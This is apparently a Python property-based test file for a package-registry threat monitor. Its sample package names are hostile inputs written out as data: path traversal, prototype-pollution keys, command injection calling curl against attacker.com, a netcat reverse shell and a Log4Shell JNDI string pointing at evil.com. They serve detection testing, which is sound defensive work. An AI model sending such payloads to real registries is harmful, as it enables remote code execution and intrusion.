"""Property-based tests for PackageRegistryMonitor (Properties 52-56)."""

from datetime import datetime, timedelta, timezone
import uuid
from hypothesis import given, settings, strategies as st
import pytest
from pydantic import ValidationError

from blackwall.enterprise.advanced_threat_detection import (
    EventSource,
    NormalizedEvent,
    RegistryThreatEvidence,
)
from blackwall.enterprise.advanced_threat_detection.registry import (
    PackageRegistryMonitor,
)
from blackwall.enterprise.advanced_threat_detection.store import AttackGraphStore


def make_registry_event(
    agent_id: str,
    action: str,
    target: str,
    offset_seconds: float,
    metadata: dict = None,
    source: EventSource = EventSource.PIPELINE_EXECUTION,
) -> NormalizedEvent:
    """Helper for generating NormalizedEvents in property tests."""
    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    return NormalizedEvent(
        event_id=uuid.uuid4(),
        timestamp=base_time + timedelta(seconds=offset_seconds),
        source=source,
        agent_id=agent_id,
        action=action,
        target=target,
        metadata=metadata or {},
        risk_score=0.8,
    )


@given(
    agent_id=st.text(min_size=1, max_size=20).filter(lambda s: bool(s.strip())),
    package_name=st.sampled_from([
        "../../etc/passwd",
        "..%2f..%2fconfig.json",
        "__proto__",
        "constructor.prototype",
        "pkg; curl http://attacker.com",
        "pkg | nc -e /bin/sh",
        "${jndi:ldap://evil.com/a}",
    ]),
    registry_type=st.sampled_from(["npm", "PyPI", "Artifactory"]),
)
@settings(max_examples=25)
@pytest.mark.asyncio
async def test_property_52_malformed_registry_request(
    agent_id: str, package_name: str, registry_type: str
):
    """Property 52: For any malformed package request to a registry proxy, exploit probing is detected."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)
    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(hours=1))

    event = make_registry_event(
        agent_id=agent_id,
        action="GET",
        target=f"https://registry.example.com/{registry_type.lower()}/{package_name}",
        offset_seconds=10.0,
        metadata={
            "registry_type": registry_type,
            "package_name": package_name,
        },
    )
    await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(agent_id=agent_id, time_window=time_window)
    assert len(evidences) >= 1
    assert any(len(e.exploit_indicators) >= 1 for e in evidences)


@given(
    agent_id=st.text(min_size=1, max_size=20).filter(lambda s: bool(s.strip())),
    num_404s=st.integers(min_value=5, max_value=15),
    registry_type=st.sampled_from(["npm", "PyPI", "Artifactory"]),
)
@settings(max_examples=15)
@pytest.mark.asyncio
async def test_property_53_unusual_registry_pattern(
    agent_id: str, num_404s: int, registry_type: str
):
    """Property 53: For any request pattern deviating from normal behavior (e.g. rapid 404 scanning), unusual patterns are detected."""
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)
    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(minutes=5))

    for i in range(num_404s):
        event = make_registry_event(
            agent_id=agent_id,
            action="GET",
            target=f"https://registry.example.com/{registry_type.lower()}/nonexistent-{i}",
            offset_seconds=float(i * 2),
            metadata={
                "registry_type": registry_type,
                "package_name": f"nonexistent-{i}",
                "status_code": 404,
            },
        )
        await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(agent_id=agent_id, time_window=time_window)
    assert len(evidences) >= 1
    assert any(e.registry_type.lower() == registry_type.lower() for e in evidences)


@given(
    registry_type=st.sampled_from(["Artifactory", "npm", "PyPI", "Cargo", "RubyGems"]),
    package_name=st.text(min_size=1, max_size=30).filter(lambda s: bool(s.strip())),
)
@settings(max_examples=25)
def test_property_54_registry_threat_evidence_type(
    registry_type: str, package_name: str
):
    """Property 54: For any RegistryThreatEvidence, the registry_type is included."""
    evidence = RegistryThreatEvidence(
        registry_type=registry_type,
        package_name=package_name,
        exploit_indicators=["Sample indicator"],
        cve_candidates=["CVE-2021-44228"],
    )
    assert evidence.registry_type == registry_type
    assert evidence.package_name == package_name


@given(
    indicators=st.lists(st.text(min_size=1, max_size=30), min_size=1, max_size=5),
    cves=st.lists(st.text(min_size=1, max_size=20), min_size=0, max_size=5),
)
@settings(max_examples=25)
def test_property_55_registry_threat_evidence_indicators(
    indicators: list, cves: list
):
    """Property 55: For any RegistryThreatEvidence, exploit_indicators and cve_candidates lists are included."""
    evidence = RegistryThreatEvidence(
        registry_type="npm",
        package_name="test-pkg",
        exploit_indicators=indicators,
        cve_candidates=cves,
    )
    assert evidence.exploit_indicators == indicators
    assert evidence.cve_candidates == cves


@given(
    cve_keyword=st.sampled_from([
        ("${jndi:ldap://test}", "CVE-2021-44228"),
        ("../../../../etc/passwd", "CVE-2020-7980"),
        ("__proto__", "CVE-2020-7774"),
        ("internal-corp-auth-pkg", "CVE-2021-38153"),
    ]),
)

@settings(max_examples=20)
@pytest.mark.asyncio
async def test_property_56_registry_cve_correlation(cve_keyword: tuple):
    """Property 56: Detected registry exploit patterns compare against known CVE exploitation signatures."""
    payload, expected_cve = cve_keyword
    store = AttackGraphStore(in_memory=True)
    monitor = PackageRegistryMonitor(store=store)
    base_time = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    time_window = (base_time, base_time + timedelta(hours=1))

    event = make_registry_event(
        agent_id="cve-agent",
        action="GET",
        target=f"https://registry.example.com/{payload}",
        offset_seconds=5.0,
        metadata={
            "registry_type": "npm",
            "package_name": payload,
            "query": payload,
        },
    )
    await store.insert_event(event)

    evidences = await monitor.detect_exploit_probing(agent_id="cve-agent", time_window=time_window)
    assert len(evidences) >= 1
    assert any(expected_cve in cve for e in evidences for cve in e.cve_candidates)


@pytest.mark.asyncio
async def test_property_invalid_time_window_rejection():
    """Property rejection test: invalid reversed time window raises ValueError."""
    monitor = PackageRegistryMonitor()
    t_start = datetime(2026, 8, 13, 12, 0, 0, tzinfo=timezone.utc)
    t_end = datetime(2026, 8, 13, 11, 0, 0, tzinfo=timezone.utc)
    with pytest.raises(ValueError):
        await monitor.detect_exploit_probing(time_window=(t_start, t_end))
